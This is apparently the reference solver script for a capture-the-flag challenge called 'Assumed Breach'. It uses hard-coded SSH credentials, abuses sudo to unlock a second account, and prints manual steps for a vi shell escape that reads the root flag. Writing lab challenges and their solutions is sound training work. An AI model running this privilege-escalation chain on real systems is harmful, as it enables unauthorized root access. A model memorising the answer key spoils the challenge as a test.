#!/usr/bin/env python3
"""
solve.py - Reference solver for "Assumed Breach"
Requires: pip install paramiko

Usage:
    python3 solve.py <target_ip> <target_port>

Example:
    python3 solve.py 10.10.10.50 2222
"""

import sys
import paramiko

JAKE_USER = "jake"
JAKE_PASS = "2eEhVmkzMHTq"
MITCHEL_USER = "mitchel"
MITCHEL_PASS = "sZus5bpFphyq"

def ssh_exec(client, cmd):
    _, stdout, stderr = client.exec_command(cmd)
    out = stdout.read().decode().strip()
    err = stderr.read().decode().strip()
    return out, err

def connect(host, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=user, password=password)
    return client

def main():
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print("=" * 50)
    print("  Assumed Breach — Reference Solver")
    print("=" * 50)

    # Stage 1 — Connect as jake
    print(f"\n[*] Stage 1 — Connecting as jake to {host}:{port}...")
    jake = connect(host, port, JAKE_USER, JAKE_PASS)
    print("[+] Connected as jake")

    out, _ = ssh_exec(jake, "id")
    print(f"    {out}")

    out, _ = ssh_exec(jake, "sudo -l")
    print(f"[*] jake sudo rules:\n    {out}")

    # Stage 2 — Unlock mitchel
    print("\n[*] Stage 2 — Unlocking mitchel...")
    out, err = ssh_exec(jake, "sudo /usr/bin/passwd -u mitchel")
    print(f"[+] {out or err}")
    jake.close()

    # Stage 3 — Connect as mitchel
    print(f"\n[*] Stage 3 — Connecting as mitchel...")
    mitchel = connect(host, port, MITCHEL_USER, MITCHEL_PASS)
    print("[+] Connected as mitchel")

    out, _ = ssh_exec(mitchel, "sudo -l")
    print(f"[*] mitchel sudo rules:\n    {out}")

    mitchel.close()

    print("\n[!] Stage 3 privesc (vi escape) must be done manually.")
    print("    Run: sudo /usr/bin/readfile /home/jake/todolist.txt")
    print("    Then in vi: :!/bin/sh")
    print("    Then: cat /root/flag.txt")

if __name__ == "__main__":
    main()
